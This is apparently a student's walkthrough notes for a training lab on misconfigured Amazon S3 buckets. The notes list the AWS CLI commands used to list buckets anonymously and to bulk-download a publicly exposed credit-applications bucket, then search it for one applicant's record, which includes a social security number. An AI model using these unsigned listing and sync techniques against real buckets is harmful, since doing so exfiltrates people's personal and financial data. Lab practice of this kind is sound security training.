http://testdata.s3.amazonaws.com/examplefolder/examplefile.txt
aws --endpoint-url [target URl/IP] s3 [command] s3://[s3 bucket name]

--no-sign-request

Given bucket names
immersive-code-assets
immersive-library-books
immersive-credit-applications

aws --endpoint-url http://10.102.8.154 s3 ls s3://immersive-code-assets --no-sign-request

Machines S3 10.102.8.154 (Private)

Tasks
Examine the specified S3 buckets.
Identify the misconfigured bucket.


Question 1 of 4
Using a web browser to examine a bucket, what is the maximum number of keys (files) the HTTP request will display?
Tried:
http://immersive-code-assets.s3.amazonaws.com/
http://10.102.8.154.s3.amazonaws.com/immersive-code-assets/css/bootstrap.min.css

No, I had to Google. https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjects.html
Answer: 1,000




Question 2 of 4
Which three directories are present in the immersive-code-assets bucket? Please enter each name in alphabetical order and separated with a comma.
aws --endpoint-url http://10.102.8.154 s3 ls s3://immersive-code-assets --no-sign-request
Answer: css,images,js

Question 3 of 4
Which S3 bucket has been misconfigured to allow public access?

http://immersive-credit-applications.s3.amazonaws.com/2020-01-04/13:38:58/8261-michelle_williams/credit_score.txt
http://immersive-code-assets.s3.amazonaws.com/css/bootstrap.min.css

aws --endpoint-url http://10.102.8.154 s3 ls s3://immersive-library-books --no-sign-request
An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied.

Answer: immersive-credit-applications

Question 4 of 4
What is Carla Riley’s social security number?


I'm going to look up how to use the cp and sync command:
run aws s3 cp help

cp <LocalPath><S3Uri> or <S3Uri><LocalPath> or <S3Uri><S3Uri>

--dryrun
--include <value>
--acl<value>
cp didn't copy

Tried sync, worked!
aws --endpoint-url http://10.102.8.154 s3 sync  s3://immersive-credit-applications/ /home/forensics/Documents --include Riley --no-sign-request

Ok, this gave more than Riley, way more.

find command?
Couldn't quite get it to find the file, so let's output the text to a file and then grep from that file.
find ~/Documents *carla_riley -print >> 0000.txt 
cat 0000.txt | grep riley

/home/forensics/Documents/2020-03-12/17:00:16/9008-carla_riley
/home/forensics/Documents/2020-03-12/17:00:16/9008-carla_riley/credit_score.txt
/home/forensics/Documents/2020-03-12/17:00:16/9008-carla_riley/application.txt

The application has her info
Name: Carla Riley
Gender: F
Address: 9560 Brain Square Apt. 529
East Tom, NJ 08584
Profession: Public affairs consultant
Email Address: carlariley@hotmail.com
Social Security Number: 559-50-3126

Also, credit score had this
FICO Score 8
Equifax
505


Answer: 559-50-3126

